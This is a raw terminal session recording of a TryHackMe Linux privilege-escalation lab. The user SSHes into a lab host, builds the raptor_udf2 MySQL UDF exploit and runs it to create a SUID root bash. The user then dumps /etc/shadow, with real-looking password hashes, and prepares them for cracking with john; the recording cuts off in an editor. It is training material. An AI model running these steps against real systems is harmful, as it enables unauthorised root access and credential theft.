@@ -1,0 +1,587 @@
+Script started on 2020-12-18 07:08:35-0500
+Welcome, Le Aundre! It's 
+Friday, December 18 2020
+And now your moment of Zen:
+It is so very hard to be an
+on-your-own-take-care-of-yourself-because-there-is-no-one-else-to-do-it-for-you
+grown-up.
+Hardware Information:
+No sensors found!
+Make sure you loaded all the kernel drivers you need.
+Try sensors-detect to find out which these are.
+ 07:08:35 up 11:08,  0 users,  load average: 0.52, 0.58, 0.59
+              total        used        free      shared  buff/cache   available
+Mem:          16120        8902        6993          17         223        7086
+Swap:         15032         145       14887
+[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0m[K[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0m[K[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0m[K[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0m[K[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0mssh user@10.10.166.44
+The authenticity of host '10.10.166.44 (10.10.166.44)' can't be established.
+RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.166.44' (RSA) to the list of known hosts.
+user@10.10.166.44's password: 
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri May 15 06:41:23 2020 from 192.168.1.125
+]0;user@debian: ~user@debian:~$ id
+uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
+]0;user@debian: ~user@debian:~$ ls
+myvpn.ovpn  [0m[01;34mtools[0m
+]0;user@debian: ~user@debian:~$ cd tools/mysql-udf/
+]0;user@debian: ~/tools/mysql-udfuser@debian:~/tools/mysql-udf$ ls
+raptor_udf2.c
+]0;user@debian: ~/tools/mysql-udfuser@debian:~/tools/mysql-udf$ gcc -g [K[Kg -c raptor_udf2.c -f{IC[K[K[KPIC
+]0;user@debian: ~/tools/mysql-udfuser@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2. so -o raptor_udf2.so raptor_udf2.o -lc
+]0;user@debian: ~/tools/mysql-udfuser@debian:~/tools/mysql-udf$ myse[Kql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 35
+Server version: 5.1.73-1+deb6u1 (Debian)
+
+Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> use mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> create table foo(line blob);
+Query OK, 0 rows affected (0.01 sec)
+
+mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/ra ptor_udf2.so'));
+Query OK, 1 row affected (0.00 sec)
+
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_u df2.so';
+Query OK, 1 row affected (0.00 sec)
+
+mysql> create function do_system returns integer soname 'raptor_udf2.s o';
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/ro otbash');
++------------------------------------------------------------------+
+| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
++------------------------------------------------------------------+
+|                                                                0 |
++------------------------------------------------------------------+
+1 row in set (0.01 sec)
+
+mysql> \q
+Bye
+]0;user@debian: ~/tools/mysql-udfuser@debian:~/tools/mysql-udf$ /tmp/rootbash -p
+rootbash-4.1# id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+rootbash-4.1# exi[K[K[Klss
+rootbash: lss: command not found
+rootbash-4.1# ls
+raptor_udf2.c  raptor_udf2.o  raptor_udf2.so
+rootbash-4.1# rm .[K/tmp/rootbash 
+rootbash-4.1# exit
+exit
+]0;user@debian: ~/tools/mysql-udfuser@debian:~/tools/mysql-udf$ ls -l /etc/shadow[Kw
+-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
+]0;user@debian: ~/tools/mysql-udfuser@debian:~/tools/mysql-udf$ cat /etc/shadow
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+daemon:*:17298:0:99999:7:::
+bin:*:17298:0:99999:7:::
+sys:*:17298:0:99999:7:::
+sync:*:17298:0:99999:7:::
+games:*:17298:0:99999:7:::
+man:*:17298:0:99999:7:::
+lp:*:17298:0:99999:7:::
+mail:*:17298:0:99999:7:::
+news:*:17298:0:99999:7:::
+uucp:*:17298:0:99999:7:::
+proxy:*:17298:0:99999:7:::
+www-data:*:17298:0:99999:7:::
+backup:*:17298:0:99999:7:::
+list:*:17298:0:99999:7:::
+irc:*:17298:0:99999:7:::
+gnats:*:17298:0:99999:7:::
+nobody:*:17298:0:99999:7:::
+libuuid:!:17298:0:99999:7:::
+Debian-exim:!:17298:0:99999:7:::
+sshd:*:17298:0:99999:7:::
+user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+statd:*:17299:0:99999:7:::
+mysql:!:18133:0:99999:7:::
+]0;user@debian: ~/tools/mysql-udfuser@debian:~/tools/mysql-udf$ [K]0;user@debian: ~/tools/mysql-udfuser@debian:~/tools/mysql-udf$ cd
+]0;user@debian: ~user@debian:~$ ls
+myvpn.ovpn  [0m[01;34mtools[0m
+]0;user@debian: ~user@debian:~$ touch hash.txt[1P[1P[1P[1P[1P hash.txtn hash.txta hash.txtn hash.txto hash.txt
+[?1049h[1;35r(B[m[4l[?7h[?12l[?25h[?1h=[?1h=[?1h=[39;49m[39;49m(B[m[H[2J(B[0;7m  GNU nano 2.2.4                                    File: hash.txt                                                                              [33;67H[ New File ][34d^G(B[m Get Help[34;25H(B[0;7m^O(B[m WriteOut[34;49H(B[0;7m^R(B[m Read File[34;73H(B[0;7m^Y(B[m Prev Page[34;97H(B[0;7m^K(B[m Cut Text[34;121H(B[0;7m^C(B[m Cur Pos[35d(B[0;7m^X(B[m Exit[35;25H(B[0;7m^J(B[m Justify[35;49H(B[0;7m^W(B[m Where Is[35;73H(B[0;7m^V(B[m Next Page[35;97H(B[0;7m^U(B[m UnCut Text[35;121H(B[0;7m^T(B[m To Spell[3d[1;135H(B[0;7mModified[3d(B[m$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0[33d[K[3;99H[33d(B[0;7mSave modified buffer (ANSWERING "No" WILL DESTROY CHANGES) ?                                                                                    [34;1H Y(B[m Yes[K[35d(B[0;7m N(B[m No  [35;17H(B[0;7m^C(B[m Cancel[K[33;62H(B[0;7mFile Name to Write: hash.txt                                [34d^G(B[m Get Help[34;37H(B[0;7mM-D(B[m DOS Format[34;73H(B[0;7mM-A(B[m Append[34;109H(B[0;7mM-B(B[m Backup File[35d(B[0;7m^C(B[m Cancel[17G         [35;37H(B[0;7mM-M(B[m Mac Format[35;73H(B[0;7mM-P(B[m Prepend[33;29H[34d[39;49m(B[m[J[1;135H(B[0;7m        [33;64H(B[m[1K (B[0;7m[ Wrote 1 line ](B[m[K[35;144H[35;1H[?1049l[?1l>]0;user@debian: ~user@debian:~$ john --word[K[K[K[K[K[K[K[K[K[K[Kjohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+-bash: john: command not found
+]0;user@debian: ~user@debian:~$ ls .u[K[K/usr/share/wo[K[K
+[0m[01;34macpi-support[0m  [01;34mbug[0m              [01;34mdebianutils[0m  [01;34mgdb[0m              [01;34minitrd-tools[0m         [01;34mlintian[0m  [01;34mmysql-common[0m       [01;34mpam-configs[0m  [01;34mssh[0m       [01;34mX11[0m
+[01;34madduser[0m       [01;34mcalendar[0m         [01;34mdict[0m         [01;34mgnupg[0m            [01;34minitscripts[0m          [01;34mlocale[0m   [01;34mnano[0m               [01;34mperl[0m         [01;34mssl-cert[0m  [01;34mxml[0m
+[01;34mapache2[0m       [01;34mcommon-licenses[0m  [01;34mdoc[0m          [01;34mgroff[0m            [01;34minsserv[0m              [01;34mman[0m      [01;34mncat[0m               [01;34mperl5[0m        [01;34msysvinit[0m  [01;34mxml-core[0m
+[01;34mapplications[0m  [01;34mconsolefonts[0m     [01;34mdoc-base[0m     [01;34mgrub[0m             [01;34minstallation-report[0m  [01;34mman8[0m     [01;34mnfs-common[0m         [01;34mpixmaps[0m      [01;34msysv-rc[0m   [01;34mzoneinfo[0m
+[01;34maptitude[0m      [01;34mconsole-setup[0m    [01;34mdpkg[0m         [01;34mi18n[0m             [01;34miptables[0m             [01;34mman-db[0m   [01;34mnfs-kernel-server[0m  [01;34mpkgconfig[0m    [01;34mtabset[0m
+[01;34mbase-files[0m    [01;34mconsoletrans[0m     [01;34me2fsprogs[0m    [01;34mifupdown[0m         [01;34mjava[0m                 [01;34mmenu[0m     [01;34mnginx[0m              [01;34mreadline[0m     [01;34mtasksel[0m
+[01;34mbase-passwd[0m   [01;34mdebconf[0m          [01;34mexim4[0m        [01;34minfo[0m             [01;34mkeyrings[0m             [01;34mmisc[0m     [01;34mnmap[0m               [01;34msgml[0m         [01;34mterminfo[0m
+[01;34mbinfmts[0m       [01;34mdebhelper[0m        [01;34mfile[0m         [01;34minitramfs-tools[0m  [01;34mlibdbi-perl[0m          [01;34mmysql[0m    [01;34mpam[0m                [01;34msgml-base[0m    [01;34mvim[0m
+]0;user@debian: ~user@debian:~$ exit
+logout
+Connection to 10.10.166.44 closed.
+[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0mls
+ReadMe.md  THMEWalkthough  hash.txt
+[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0mcat c[KH[Khash[K[K[K[K[K[K[K[Kcat hash.txt
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+daemon:*:17298:0:99999:7:::
+bin:*:17298:0:99999:7:::
+sys:*:17298:0:99999:7:::
+sync:*:17298:0:99999:7:::
+games:*:17298:0:99999:7:::
+man:*:17298:0:99999:7:::
+lp:*:17298:0:99999:7:::
+mail:*:17298:0:99999:7:::
+news:*:17298:0:99999:7:::
+uucp:*:17298:0:99999:7:::
+proxy:*:17298:0:99999:7:::
+www-data:*:17298:0:99999:7:::
+backup:*:17298:0:99999:7:::
+list:*:17298:0:99999:7:::
+irc:*:17298:0:99999:7:::
+gnats:*:17298:0:99999:7:::
+nobody:*:17298:0:99999:7:::
+libuuid:!:17298:0:99999:7:::
+Debian-exim:!:17298:0:99999:7:::
+sshd:*:17298:0:99999:7:::
+user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+statd:*:17299:0:99999:7:::
+mysql:!:18133:0:99999:7:::
+[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0mnano hash.txt
+[?1049h[22;0;0t[1;35r(B[m[4l[?7h[39;49m[?1h=[?1h=[?1h=[?25l[39;49m(B[m[H[2J[33;65H(B[0;7m[ Reading File ](B[m[33;64H(B[0;7m[ Read 24 lines ](B[m[H(B[0;7m  GNU nano 2.9.3                                                       hash.txt                                                                 [1;143H(B[m[34d(B[0;7m^G(B[m Get Help     (B[0;7m^O(B[m Write Out    (B[0;7m^W(B[m Where Is     (B[0;7m^K(B[m Cut Text     (B[0;7m^J(B[m Justify[81G(B[0;7m^C(B[m Cur Pos[97G(B[0;7mM-U(B[m Undo[34;113H(B[0;7mM-A(B[m Mark Text   (B[0;7mM-](B[m To Bracket[35d(B[0;7m^X(B[m Exit[35;17H(B[0;7m^R(B[m Read File    (B[0;7m^\(B[m Replace[49G(B[0;7m^U(B[m Uncut Text   (B[0;7m^T(B[m To Spell     (B[0;7m^_(B[m Go To Line   (B[0;7mM-E(B[m Redo[35;113H(B[0;7mM-6(B[m Copy Text   (B[0;7mM-W(B[m WhereIs Nex[?7lt[?7h[33d[3d[39;49m(B[mroot:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::[4ddaemon:*:17298:0:99999:7:::[5dbin:*:17298:0:99999:7:::[6dsys:*:17298:0:99999:7:::[7dsync:*:17298:0:99999:7:::[8dgames:*:17298:0:99999:7:::[9dman:*:17298:0:99999:7:::[10dlp:*:17298:0:99999:7:::[11dmail:*:17298:0:99999:7:::[12dnews:*:17298:0:99999:7:::[13duucp:*:17298:0:99999:7:::[14dproxy:*:17298:0:99999:7:::[15dwww-data:*:17298:0:99999:7:::[16dbackup:*:17298:0:99999:7:::[17dlist:*:17298:0:99999:7:::[18dirc:*:17298:0:99999:7:::[19dgnats:*:17298:0:99999:7:::[20dnobody:*:17298:0:99999:7:::[21dlibuuid:!:17298:0:99999:7:::[22dDebian-exim:!:17298:0:99999:7:::[23dsshd:*:17298:0:99999:7:::[24duser:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::[25dstatd:*:17299:0:99999:7:::[26dmysql:!:18133:0:99999:7:::[3d[?12l[?25h[?25l[4d[?12l[?25h[?25l[5d[?12l[?25h[?25l[A[?12l[?25h[?25l[1;135H(B[0;7mModified(B[m[4d[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l:7:::[K[?12l[?25h[?25l7:::[K[33d[K[4d[?12l[?25h[?25l:::[K[?12l[?25h[?25l:: [?12l[?25h[?25l: [?12l[?25h[?25l[K[?12l[?25h[?25l[4;33r[33;1H
+[1;35r[4;1H[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l:7:::[K[?12l[?25h[?25l7:::[K[?12l[?25h[?25l:::[K[?12l[?25h[?25l:: [?12l[?25h[?25l: [?12l[?25h[?25l[K[?12l[?25h[?25l[4;33r[33;1H
+[1;35r[4;1H[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l:7:::[K[?12l[?25h[?25l7:::[K[?12l[?25h[?25l:::[K[?12l[?25h[?25l:: [?12l[?25h[?25l: [?12l[?25h[?25l[K[?12l[?25h[?25l[4;33r[33;1H
+[1;35r[4;1H[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l:7:::[K[?12l[?25h[?25l7:::[K[?12l[?25h[?25l:::[K[?12l[?25h[?25l:: [?12l[?25h[?25l: [?12l[?25h[?25l[K[?12l[?25h[?25l[4;33r[33;1H
+[1;35r[4;1H[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[1P[?12l[?25h[?25l[33d(B[0;7mSave modified buffer?  (Answering "No" will DISCARD changes.)                                                                                   [34;1H Y(B[m Yes[K[35d(B[0;7m N(B[m No  [35;18H(B[0;7mC(B[m Cancel[K[33;63H[?12l[?25h[?25l[J[35;144H[?12l[?25h[35;1H[?1049l[23;0;0t[?1l>[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0mvim hash.txt
+[?1049h[22;0;0t[>4;2m[?1h=[?2004h[1;35r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[37m[40m[H[2J[?25l[34;1H"hash.txt" 24L, 837C[?2004h[>4;2m[?2004h[>4;2m[?2004h[>4;2m[?2004h[>4;2m[2;1H▽[6n[2;1H  [1;1H[>c]10;?]11;?[34;1H[1;1H[38;5;189m[48;5;25m hash.txt [1;12H [m[37m[40m[38;5;25m[48;5;233m [m[37m[40m[38;5;59m[48;5;233m                                                                                                                        [m[37m[40m[38;5;233m[48;5;233m[m[37m[40m[1;135H[38;5;235m[48;5;233m[m[37m[40m[1;136H[38;5;231m[48;5;235m buffers [m[37m[40m[2;1H[93m  1 [m[37m[40m[104mroot[m[37m[40m:$6$Tb/[101meuwmK[m[37m[40m$[101mOXA[m[37m[40m.[101mdwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET[m[37m[40m..[101mit8r[m[37m[40m.[101mjbrlpfZeMdwD3B0fGxJI0[m[37m[40m:17298:0:99999:7:::
+[93m  2 [m[37m[40mdaemon:*:17298:0:99999:7:::
+[93m  3 [m[37m[40mbin:*:17298:0:99999:7:::
+[93m  4 [m[37m[40m[101msys[m[37m[40m:*:17298:0:99999:7:::
+[93m  5 [m[37m[40msync:*:17298:0:99999:7:::
+[93m  6 [m[37m[40mgames:*:17298:0:99999:7:::
+[93m  7 [m[37m[40mman:*:17298:0:99999:7:::
+[93m  8 [m[37m[40m[101mlp[m[37m[40m:*:17298:0:99999:7:::
+[93m  9 [m[37m[40mmail:*:17298:0:99999:7:::
+[93m 10 [m[37m[40mnews:*:17298:0:99999:7:::
+[93m 11 [m[37m[40muucp:*:17298:0:99999:7:::
+[93m 12 [m[37m[40mproxy:*:17298:0:99999:7:::
+[93m 13 [m[37m[40mwww-data:*:17298:0:99999:7:::
+[93m 14 [m[37m[40mbackup:*:17298:0:99999:7:::
+[93m 15 [m[37m[40mlist:*:17298:0:99999:7:::
+[93m 16 [m[37m[40m[101mirc[m[37m[40m:*:17298:0:99999:7:::
+[93m 17 [m[37m[40mgnats:*:17298:0:99999:7:::
+[93m 18 [m[37m[40mnobody:*:17298:0:99999:7:::
+[93m 19 [m[37m[40m[101mlibuuid[m[37m[40m:!:17298:0:99999:7:::
+[93m 20 [m[37m[40mDebian-[101mexim[m[37m[40m:!:17298:0:99999:7:::
+[93m 21 [m[37m[40m[101msshd[m[37m[40m:*:17298:0:99999:7:::
+[93m 22 [m[37m[40muser:$6$[101mM1tQjkeb[m[37m[40m$[101mM1A[m[37m[40m/[101mArH4JeyF1zBJPLQ[m[37m[40m.[101mTZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8[m[37m[40m.:17298:0:99999:7:::
+[93m 23 [m[37m[40m[101mstatd[m[37m[40m:*:17299:0:99999:7:::
+[93m 24 [m[37m[40m[101mmysql[m[37m[40m:!:18133:0:99999:7:::
+[94m~                                                                                                                                               [27;1H~                                                                                                                                               [28;1H~                                                                                                                                               [29;1H~                                                                                                                                               [30;1H~                                                                                                                                               [31;1H~                                                                                                                                               [32;1H~                                                                                                                                               [?2004l[>4;m[?2004h[>4;2m[?2004l[>4;m[?2004h[>4;2m[m[37m[40m[33;1H[38;5;189m[48;5;25m [m[37m[40m[1m[38;5;189m[48;5;25mNORMAL[m[37m[40m[38;5;189m[48;5;25m  SPELL [EN] [m[37m[40m[38;5;25m[48;5;235m[m[37m[40m[33;22H[38;5;231m[48;5;235m ᚠ master [m[37m[40m[38;5;235m[48;5;233m[m[37m[40m[33;33H[38;5;59m[48;5;233m hash.txt                            [m[37m[40m[38;5;233m[48;5;233m[m[37m[40m[33;71H[38;5;59m[48;5;233m Gen. ctags,gtags_cscope  text [33;103H  [m[37m[40m[38;5;235m[48;5;233m[m[37m[40m[33;106H[38;5;231m[48;5;235m  utf-8 [33;115H  [m[37m[40m[38;5;25m[48;5;235m[m[37m[40m[33;118H[38;5;189m[48;5;25m 24 words 4% [m[37m[40m[1m[38;5;189m[48;5;25m☰ 1/24 ㏑[m[37m[40m[38;5;189m[48;5;25m:1 [m[37m[40m[38;5;166m[48;5;25m[m[37m[40m[33;144H[38;5;160m[48;5;166m]2;hash.txt (~/Projects/Github/ctf/thme/Linux PrivEsc) - VIM[m[37m[40m[33;23H[38;5;231m[48;5;235m+0 ~0 -0 ᚠ master [m[37m[40m[38;5;235m[48;5;233m[m[37m[40m[33;43H[38;5;59m[48;5;233mhash.txt[2;5H[?25h[?25l[m[37m[40m[34;1H[38;5;224mgutentags: gtags-cscope job failed, returned: 122[2;5H[?25h[?2004h[>4;2m]2;hash.txt (~/Projects/Github/ctf/thme/Linux PrivEsc) - VIM[?25l[m[37m[40m[35;134HV[2;5H[35;134H1[2;5H[1C[48;5;242moot[m[37m[40m[48;5;242m:$6$Tb/[m[37m[40m[48;5;242meuwmK[m[37m[40m[48;5;242m$[m[37m[40m[48;5;242mOXA[m[37m[40m[48;5;242m.[m[37m[40m[48;5;242mdwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET[m[37m[40m[48;5;242m..[m[37m[40m[48;5;242mit8r[m[37m[40m[48;5;242m.[m[37m[40m[48;5;242mjbrlpfZeMdwD3B0fGxJI0[m[37m[40m[48;5;242m:17298:0:99999:7:::[m[37m[40m[35;1H[1m-- VISUAL LINE --[m[37m[40m[35;134H[K[35;134H1[2;5H[33;1H[38;5;231m[48;5;88m [m[37m[40m[1m[38;5;231m[48;5;88mV-LINE[m[37m[40m[38;5;189m[48;5;25m [m[37m[40m[38;5;231m[48;5;88m  SPELL [EN] [m[37m[40m[38;5;88m[48;5;235m[m[37m[40m[33;23H[38;5;231m[48;5;235mᚠ master[m[37m[40m[1C[38;5;235m[48;5;233m[m[37m[40m[33;33H[38;5;231m[48;5;233m hash.txt                                          [m[37m[40m[38;5;233m[48;5;233m[m[37m[40m[33;85H[38;5;231m[48;5;233m Gen. ctags  text [33;104H  [m[37m[40m[38;5;235m[48;5;233m[m[37m[40m[33;108H[38;5;231m[48;5;235m utf-8 [33;117H [m[37m[40m[38;5;88m[48;5;235m[m[37m[40m[33;119H[38;5;231m[48;5;88m 1 words 4% [m[37m[40m[1m[38;5;231m[48;5;88m☰ 1[m[37m[40m[1m[38;5;189m[48;5;25m/[m[37m[40m[1m[38;5;231m[48;5;88m/24 ㏑[m[37m[40m[38;5;189m[48;5;25m:[m[37m[40m[38;5;231m[48;5;88m:1 [m[37m[40m[38;5;166m[48;5;88m[2;5H[?25h[?25l[m[37m[40m[33;23H[38;5;231m[48;5;235m+0 ~0 -0 ᚠ master [m[37m[40m[38;5;235m[48;5;233m[m[37m[40m[33;43H[38;5;231m[48;5;233mhash.txt[2;5H[?25h[?25l[m[37m[40m[35;134HG[2;5H[35;134H24[25;5H[2;5H[48;5;242mr[m[37m[40m[3;5H[48;5;242mdaemon:*:17298:0:99999:7:::[4;5Hbin:*:17298:0:99999:7:::[m[37m[40m[5;5H[48;5;242msys[m[37m[40m[48;5;242m:*:17298:0:99999:7:::[6;5Hsync:*:17298:0:99999:7:::[7;5Hgames:*:17298:0:99999:7:::[8;5Hman:*:17298:0:99999:7:::[m[37m[40m[9;5H[48;5;242mlp[m[37m[40m[48;5;242m:*:17298:0:99999:7:::[10;5Hmail:*:17298:0:99999:7:::[11;5Hnews:*:17298:0:99999:7:::[12;5Huucp:*:17298:0:99999:7:::[13;5Hproxy:*:17298:0:99999:7:::[14;5Hwww-data:*:17298:0:99999:7:::[15;5Hbackup:*:17298:0:99999:7:::[16;5Hlist:*:17298:0:99999:7:::[m[37m[40m[17;5H[48;5;242mirc[m[37m[40m[48;5;242m:*:17298:0:99999:7:::[18;5Hgnats:*:17298:0:99999:7:::[19;5Hnobody:*:17298:0:99999:7:::[m[37m[40m[20;5H[48;5;242mlibuuid[m[37m[40m[48;5;242m:!:17298:0:99999:7:::[21;5HDebian-[m[37m[40m[48;5;242mexim[m[37m[40m[48;5;242m:!:17298:0:99999:7:::[m[37m[40m[22;5H[48;5;242msshd[m[37m[40m[48;5;242m:*:17298:0:99999:7:::[23;5Huser:$6$[m[37m[40m[48;5;242mM1tQjkeb[m[37m[40m[48;5;242m$[m[37m[40m[48;5;242mM1A[m[37m[40m[48;5;242m/[m[37m[40m[48;5;242mArH4JeyF1zBJPLQ[m[37m[40m[48;5;242m.[m[37m[40m[48;5;242mTZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGj